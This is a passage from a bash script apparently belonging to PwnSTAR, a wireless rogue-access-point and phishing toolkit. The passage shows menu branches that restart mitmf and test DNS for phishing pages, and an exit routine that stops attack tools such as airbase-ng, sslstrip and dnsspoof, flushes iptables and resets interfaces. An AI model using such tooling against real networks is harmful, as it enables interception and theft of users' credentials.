		echo -e "$info     No internet access provided"
		echo -e "$info  Returning to menu list"
		sleep 3
		adv_final_fn

		fi

		if [[ $internet == y ]]; then


		TESTCON_fn
		sleep 1

		fi

		if [[ $apusage == 3 ]] || [[ $apusage == a ]]; then
			DNSRESPOND_fn
		echo -e "     Starting DNS Response Test"
		echo -e " An active DNS connection to internet required"
		echo -e " for phishing pages to function."
		echo -e "     Starting DNS Response Test"
		echo -e " See internet response in xterm window lower-lefthand corner."
	sleep 5

		fi

		adv_final_fn;;


	8)	if [[ $internet == n ]]; then

		echo -e "$info     No internet access provided"
		echo -e "$info  Returning to menu list"
		sleep 3
		adv_final_fn

			fi


	if  [[ $mitmfsel == 1 || $mitmfsel == 2 ]] && [[ $ssluse == y || $ssluse == Y ]] && [[ $internet == y ]]; then

			kill $mitmfpid
			sleep 2
			mitmf_fn

			else

			echo ""
			echo -e "$info    Unable as mitmf was not started during"
			echo -e "$info the initial setup."  
			sleep 3

				fi

		adv_final_fn;;


        q)  exit_fn;;
        
        *)  adv_final_fn;;
    esac
}


exit_fn()
{
    clear
	echo -e "$txtrst"
	echo -e "  Stopping processes..."
	killall -q tail airbase-ng ferret sslstrip mitmf aireplay-ng airodump-ng dhcpd dnsspoof metasploit incrond sslsplit mdk3 ping &> /dev/null
    sleep 0.5

    killall -q xterm &> /dev/null 
	echo -e "  Clearing files..."
    rm -f /tmp/ip/ip
    rmdir /tmp/ip &> /dev/null
    rm -f /tmp/custom.hosts
    rm -f /tmp/sslstrip

	if [[ $KALI_TYPE == 1 ]]; then

		   rm -f /var/www/* 2> /dev/null

		fi


	if [[ $KALI_TYPE == 2 ]] || [[ $KALI_TYPE == 3 ]]; then

		    rm -f /var/www/html/*

		fi

#    rm -f /var/www/html/*

#rm /var/spool/incron/root &> /dev/null ###

    service apache2 stop

    service incron stop

    echo "0" > /proc/sys/net/ipv4/ip_forward

    echo -e "  Stopping monitor interfaces..."

### Start Musket Adds returns device to mode managed Start####

	airmon-old_fn stop mon5 &> /dev/null
	airmon-old_fn stop mon4 &> /dev/null
	airmon-old_fn stop mon3 &> /dev/null
	airmon-old_fn stop mon2 &> /dev/null
	airmon-old_fn stop mon1 &> /dev/null
	airmon-old_fn stop mon0 &> /dev/null


sleep 1

###End Musket Adds returns device to mode managed End####
	
	iptables --flush    # delete all rules in default (filter) chains
    iptables -t nat --flush
	iptables -t mangle --flush
    iptables -X         # delete user-defined chains
    iptables -t nat -X
	iptables -t mangle -X

	if [[ $CHKKILL == y || $CHKKILL == Y ]] ; then
		
	echo ""
	echo -e "$yel!!!$warn     The airmon-ng check kill command has been used$yel !!!"
	echo -e "$info  Attempting to restart Network Manager thru service commands"

	if [[ ! -z $API ]]; then
	
	ifconfig $API down
	sleep .5
	iwconfig $API mode managed
	sleep .5	
	ifconfig $API up
	sleep .5

		fi

	if [[ ! -z $ICI ]]; then
	
	ifconfig $ICI down
	sleep .5
	iwconfig $ICI mode managed
	sleep .5
	ifconfig $ICI up
	sleep .5
		fi

	if [[ ! -z use2dos ]]; then
	
	ifconfig $use2dos down
	sleep .5
	iwconfig $use2dos mode managed
	sleep .5
	ifconfig $use2dos up
	sleep .5

		fi


	service network-manager restart 2> /dev/null > /dev/null
	sleep 1
	service NetworkManager restart 2> /dev/null > /dev/null
	sleep 1
	service avahi-daemon restart 2> /dev/null > /dev/null

	echo ""
	echo -e "$info  If wifi functions are NOT restored?."
	echo -e "$info  Suggest you reboot the computer before proceeding." 
	sleep 3
		fi

	echo -e "$bold"
	echo -e "\e[1;37m\n"
	echo -e "\e[1;37m\n"
	echo -e "\e[1;37m\n     Good-bye from the PwnSTAR!"
	echo -e ""
	echo -e "\x1b[1m $inp~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$txtrst"
sleep .1
	echo -e "\x1b[1m $inp  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$txtrst"
sleep .1
	echo -e "\x1b[1m $inp    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$txtrst"
sleep .1
	echo -e "\x1b[1m $inp      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$txtrst"
sleep .1
	echo -e "$inp        ~~~~~~~~~~~~~~~~~$txtrst Expanding the Phishing Ocean$inp ~~~~~~~~~~~~~~~~"
sleep .1
	echo -e "\x1b[1m $inp          ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$txtrst"
sleep .1
	echo -e "\x1b[1m $inp            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$txtrst"
sleep .1
	echo -e "\x1b[1m $inp              ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$txtrst"
sleep .1
	echo -e "\x1b[1m $inp                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$txtrst"
sleep .1

	echo -e "\e[1;37m\n     In Memory of Joseph John Rochefort"
	sleep .1
	echo -e "\e[1;37m\n       USN  Signals Monitoring Hawaii"
	sleep .1
	echo -e "\e[1;37m\n          Battle of Midway(aka AF)  June 1942"
	sleep .1
	echo ""
        echo -e "\e[1;37m\n   Happy Trails from Musket Teams"
	sleep .1

        echo -e "\e[1;37m\n          May the password be with you!
                                Luke Codewalker

                                   :
                                   N 
                               < W 0 E >                                
                                   S
                                   :
	
	"

    sleep 5
    echo -e "\e[0m"     # reset colours
    clear
	exit 0

}
# ~~~~~~~~~~ Main Script 2 lines!!! ~~~~~~~~~~ #

banner_fn
first_fn
`